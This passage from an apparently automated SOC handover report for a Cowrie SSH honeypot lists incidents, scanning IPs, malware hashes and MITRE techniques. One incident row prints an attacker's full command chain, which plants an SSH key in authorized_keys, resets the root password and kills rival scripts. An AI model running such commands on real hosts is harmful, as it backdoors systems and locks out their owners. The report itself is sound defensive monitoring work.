| `2026-05-12 17:07:25` | `cowrie.command.input` |
| `2026-05-12 17:07:25` | `cowrie.log.closed` |
| `2026-05-12 17:07:26` | `cowrie.session.params` |
| `2026-05-12 17:07:26` | `cowrie.command.input` |
| `2026-05-12 17:07:26` | `cowrie.log.closed` |
| `2026-05-12 17:07:26` | `cowrie.session.params` |
| `2026-05-12 17:07:26` | `cowrie.command.input` |
| `2026-05-12 17:07:26` | `cowrie.log.closed` |
| `2026-05-12 17:07:27` | `cowrie.session.params` |
| `2026-05-12 17:07:27` | `cowrie.command.input` |
| `2026-05-12 17:07:27` | `cowrie.log.closed` |
| `2026-05-12 17:07:27` | `cowrie.session.params` |
| `2026-05-12 17:07:27` | `cowrie.command.input` |
| `2026-05-12 17:07:27` | `cowrie.log.closed` |
| `2026-05-12 17:07:27` | `cowrie.session.params` |
| `2026-05-12 17:07:27` | `cowrie.command.input` |
| `2026-05-12 17:07:28` | `cowrie.log.closed` |
| `2026-05-12 17:07:28` | `cowrie.session.params` |
| `2026-05-12 17:07:28` | `cowrie.command.input` |
| `2026-05-12 17:07:28` | `cowrie.log.closed` |
| `2026-05-12 17:07:28` | `cowrie.session.params` |
| `2026-05-12 17:07:28` | `cowrie.command.input` |
| `2026-05-12 17:07:28` | `cowrie.log.closed` |
| `2026-05-12 17:07:29` | `cowrie.session.params` |
| `2026-05-12 17:07:29` | `cowrie.command.input` |
| `2026-05-12 17:07:29` | `cowrie.log.closed` |
| `2026-05-12 17:07:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.229.191[.]90` to AbuseIPDB if not already reported
- [ ] Block `121.229.191[.]90` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e14b0df417b

| Field | Detail |
|---|---|
| **Source IP** | `183.56.216[.]153` |
| **First Seen** | 2026-05-12 17:10 |
| **Last Seen** | 2026-05-12 17:11 |
| **Session Duration** | 64s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:BKlfslXm2Gpt"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-12 17:10:05` | `cowrie.session.connect` |
| `2026-05-12 17:10:05` | `cowrie.client.version` |
| `2026-05-12 17:10:06` | `cowrie.client.kex` |
| `2026-05-12 17:10:12` | `cowrie.login.success` |
| `2026-05-12 17:10:12` | `cowrie.session.params` |
| `2026-05-12 17:10:12` | `cowrie.command.input` |
| `2026-05-12 17:10:12` | `cowrie.command.failed` |
| `2026-05-12 17:10:13` | `cowrie.log.closed` |
| `2026-05-12 17:10:13` | `cowrie.session.params` |
| `2026-05-12 17:10:13` | `cowrie.command.input` |
| `2026-05-12 17:10:14` | `cowrie.session.file_download` |
| `2026-05-12 17:10:14` | `cowrie.log.closed` |
| `2026-05-12 17:10:30` | `cowrie.session.params` |
| `2026-05-12 17:10:30` | `cowrie.command.input` |
| `2026-05-12 17:10:31` | `cowrie.log.closed` |
| `2026-05-12 17:10:32` | `cowrie.session.params` |
| `2026-05-12 17:10:32` | `cowrie.command.input` |
| `2026-05-12 17:10:32` | `cowrie.log.closed` |
| `2026-05-12 17:10:32` | `cowrie.session.params` |
| `2026-05-12 17:10:32` | `cowrie.command.input` |
| `2026-05-12 17:10:32` | `cowrie.session.file_download` |
| `2026-05-12 17:10:32` | `cowrie.log.closed` |
| `2026-05-12 17:10:33` | `cowrie.session.params` |
| `2026-05-12 17:10:33` | `cowrie.command.input` |
| `2026-05-12 17:10:33` | `cowrie.log.closed` |
| `2026-05-12 17:10:34` | `cowrie.session.params` |
| `2026-05-12 17:10:34` | `cowrie.command.input` |
| `2026-05-12 17:10:37` | `cowrie.log.closed` |
| `2026-05-12 17:10:38` | `cowrie.session.params` |
| `2026-05-12 17:10:38` | `cowrie.command.input` |
| `2026-05-12 17:10:38` | `cowrie.command.input` |
| `2026-05-12 17:10:39` | `cowrie.log.closed` |
| `2026-05-12 17:10:42` | `cowrie.session.params` |
| `2026-05-12 17:10:42` | `cowrie.command.input` |
| `2026-05-12 17:10:43` | `cowrie.log.closed` |
| `2026-05-12 17:10:44` | `cowrie.session.params` |
| `2026-05-12 17:10:44` | `cowrie.command.input` |
| `2026-05-12 17:10:44` | `cowrie.log.closed` |
| `2026-05-12 17:10:47` | `cowrie.session.params` |
| `2026-05-12 17:10:47` | `cowrie.command.input` |
| `2026-05-12 17:10:48` | `cowrie.log.closed` |
| `2026-05-12 17:10:49` | `cowrie.session.params` |
| `2026-05-12 17:10:49` | `cowrie.command.input` |
| `2026-05-12 17:10:59` | `cowrie.log.closed` |
| `2026-05-12 17:11:02` | `cowrie.session.params` |
| `2026-05-12 17:11:02` | `cowrie.command.input` |
| `2026-05-12 17:11:02` | `cowrie.log.closed` |
| `2026-05-12 17:11:04` | `cowrie.session.params` |
| `2026-05-12 17:11:04` | `cowrie.command.input` |
| `2026-05-12 17:11:05` | `cowrie.log.closed` |
| `2026-05-12 17:11:06` | `cowrie.session.params` |
| `2026-05-12 17:11:06` | `cowrie.command.input` |
| `2026-05-12 17:11:06` | `cowrie.log.closed` |
| `2026-05-12 17:11:07` | `cowrie.session.params` |
| `2026-05-12 17:11:07` | `cowrie.command.input` |
| `2026-05-12 17:11:07` | `cowrie.log.closed` |
| `2026-05-12 17:11:08` | `cowrie.session.params` |
| `2026-05-12 17:11:08` | `cowrie.command.input` |
| `2026-05-12 17:11:08` | `cowrie.log.closed` |
| `2026-05-12 17:11:09` | `cowrie.session.params` |
| `2026-05-12 17:11:09` | `cowrie.command.input` |
| `2026-05-12 17:11:09` | `cowrie.log.closed` |
| `2026-05-12 17:11:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.56.216[.]153` to AbuseIPDB if not already reported
- [ ] Block `183.56.216[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `23.94.77[.]145` | **616** | 2026-05-12 14:32 | 2026-05-12 18:02 | 300m | 0 | `T1592` | 🟠 MEDIUM |
| `221.229.218[.]50` | **20** | 2026-05-12 16:47 | 2026-05-12 17:06 | 40m | 0 | `T1592` | 🟠 MEDIUM |
| `192.116.62[.]184` | **5** | 2026-05-12 16:08 | 2026-05-12 16:14 | 10m | 0 | `T1592` | 🟢 LOW |
| `45.167.165[.]251` | **5** | 2026-05-12 17:31 | 2026-05-12 17:39 | 10m | 0 | `T1592` | 🟢 LOW |
| `205.185.121[.]144` | **4** | 2026-05-12 16:14 | 2026-05-12 17:07 | 2m | 0 | `T1592` | 🟢 LOW |
| `121.229.191[.]90` | **2** | 2026-05-12 17:07 | 2026-05-12 17:09 | 4m | 0 | `T1592` | 🟢 LOW |
| `128.203.201[.]208` | **2** | 2026-05-12 16:16 | 2026-05-12 16:17 | 0m | 0 | `T1592` | 🟢 LOW |
| `14.103.114[.]89` | **2** | 2026-05-12 16:52 | 2026-05-12 16:54 | 2m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `183.56.216[.]153` | **2** | 2026-05-12 17:10 | 2026-05-12 17:12 | 4m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]105` | **2** | 2026-05-12 17:03 | 2026-05-12 17:04 | 0m | 0 | `T1592` | 🟢 LOW |
| `102.88.137[.]80` | 1 | 2026-05-12 16:27 | 2026-05-12 16:27 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `115.178.75[.]243` | 1 | 2026-05-12 17:06 | 2026-05-12 17:06 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `115.239.250[.]31` | 1 | 2026-05-12 14:52 | 2026-05-12 14:54 | 120s | 0 | `T1592` | 🟢 LOW |
| `117.50.70[.]125` | 1 | 2026-05-12 16:47 | 2026-05-12 16:48 | 27s | 0 | `T1592` | 🟢 LOW |
| `118.196.38[.]83` | 1 | 2026-05-12 15:09 | 2026-05-12 15:11 | 120s | 0 | `T1592` | 🟢 LOW |
| `118.196.56[.]74` | 1 | 2026-05-12 16:09 | 2026-05-12 16:09 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `120.48.106[.]235` | 1 | 2026-05-12 14:49 | 2026-05-12 14:49 | 10s | 0 | `T1592` | 🟢 LOW |
| `120.48.109[.]159` | 1 | 2026-05-12 16:53 | 2026-05-12 16:55 | 120s | 0 | `T1592` | 🟢 LOW |
| `124.29.223[.]186` | 1 | 2026-05-12 16:14 | 2026-05-12 16:15 | 17s | 0 | `T1592` | 🟢 LOW |
| `14.103.118[.]198` | 1 | 2026-05-12 15:09 | 2026-05-12 15:11 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.116.156[.]100` | 1 | 2026-05-12 17:49 | 2026-05-12 17:51 | 120s | 0 | `T1592` | 🟢 LOW |
| `158.69.194[.]208` | 1 | 2026-05-12 16:54 | 2026-05-12 16:54 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `180.76.105[.]165` | 1 | 2026-05-12 16:24 | 2026-05-12 16:25 | 39s | 0 | `T1592` | 🟢 LOW |
| `180.76.184[.]79` | 1 | 2026-05-12 16:47 | 2026-05-12 16:49 | 120s | 0 | `T1592` | 🟢 LOW |
| `183.56.216[.]153` | 1 | 2026-05-12 14:52 | 2026-05-12 14:54 | 120s | 0 | `T1592` | 🟢 LOW |
| `2.26.252[.]153` | 1 | 2026-05-12 16:36 | 2026-05-12 16:36 | 4s | 0 | `T1592` | 🟢 LOW |
| `202.103.55[.]158` | 1 | 2026-05-12 15:11 | 2026-05-12 15:13 | 120s | 0 | `T1592` | 🟢 LOW |
| `220.205.123[.]19` | 1 | 2026-05-12 16:25 | 2026-05-12 16:27 | 120s | 0 | `T1592` | 🟢 LOW |
| `58.48.170[.]235` | 1 | 2026-05-12 14:51 | 2026-05-12 14:53 | 120s | 0 | `T1592` | 🟢 LOW |
| `70.177.80[.]195` | 1 | 2026-05-12 17:00 | 2026-05-12 17:00 | 13s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (28 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 41/100 | 🟡 MEDIUM | **28/75** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 13/100 | 🟢 LOW | **33/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `2.26.252[.]153` | DE | Kyonix Hosting - kyonix.com | **100** ⚠️ | 30 |
| `118.196.56[.]74` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 13 |
| `102.88.137[.]80` | NG | MTN Nigeria | **100** ⚠️ | 50 |
| `185.220.101[.]109` | DE | Digitalcourage e.V. | **100** ⚠️ | 50 |
| `117.50.70[.]125` | CN | Shanghai UCloud Information Technology Company Limited | **100** ⚠️ | 50 |
| `221.229.218[.]50` | CN | CHINANET jiangsu province network | **100** ⚠️ | 50 |
| `66.132.195[.]105` | US | Censys, Inc. | **100** ⚠️ | 50 |
| `202.103.55[.]158` | CN | CHINANET Hubei province network | **100** ⚠️ | 50 |
| `14.103.114[.]89` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `118.196.38[.]83` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 17 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 59 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 10 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 6 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 6 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 5 |

---

## 🔕 False Positive Summary (183 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 16 |
| AbuseIPDB score 14 below threshold 25 | 8 |
| AbuseIPDB score 16 below threshold 25 | 6 |
| AbuseIPDB score 18 below threshold 25 | 1 |
| AbuseIPDB score 2 below threshold 25 | 1 |
| AbuseIPDB score 22 below threshold 25 | 4 |
| AbuseIPDB score 23 below threshold 25 | 5 |
| AbuseIPDB score 24 below threshold 25 | 2 |
| AbuseIPDB score 3 below threshold 25 | 1 |
| AbuseIPDB score 4 below threshold 25 | 5 |
| AbuseIPDB score 5 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 133 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 873 cases |
| Tool 34  | Credential Extractor        | ✅ 15 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 8 fingerprints |
| Tool 36  | Command Clustering          | ✅ 3 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 62 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 183 filtered (21.0%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 18 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 28 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 10 priority case(s) shown individually · 30 recon entry/entries in table (10 group(s) consolidating 660 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-12T18:03:29Z_
